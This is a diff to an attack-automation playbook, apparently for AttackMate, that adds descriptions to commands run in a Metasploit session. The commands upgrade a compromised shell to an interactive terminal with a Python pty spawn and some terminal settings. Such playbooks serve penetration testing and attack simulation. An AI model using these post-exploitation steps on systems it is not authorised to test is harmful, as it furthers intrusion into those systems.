@@ -1,23 +1,35 @@
 commands:
   - type: debug
     varstore: True
+    metadata:
+      description: "Print attackmate variables"
 
   - type: msf-session
     cmd: python -c "import pty;pty.spawn(\"/bin/bash\")";
     session: $UPGRADESESSION
+    metadata:
+      description: "Run Python and use the pty module to create a pseudo-terminal (PTY)"
 
   - type: msf-session
     cmd: export SHELL=bash
     session: $UPGRADESESSION
+    metadata:
+      description: "Set the SHELL environment variable"
 
   - type: msf-session
     cmd: export TERM=xterm256-color
     session: $UPGRADESESSION
+    metadata:
+      description: "Set terminal type capabilities"
 
   - type: msf-session
     cmd: stty rows 38 columns 116
     session: $UPGRADESESSION
+    metadata:
+      description: "Configure terminal dimensions"
 
   - type: msf-session
     cmd: 'export PS1=" >"'
     session: $UPGRADESESSION
+    metadata:
+      description: "Set the shell prompt"
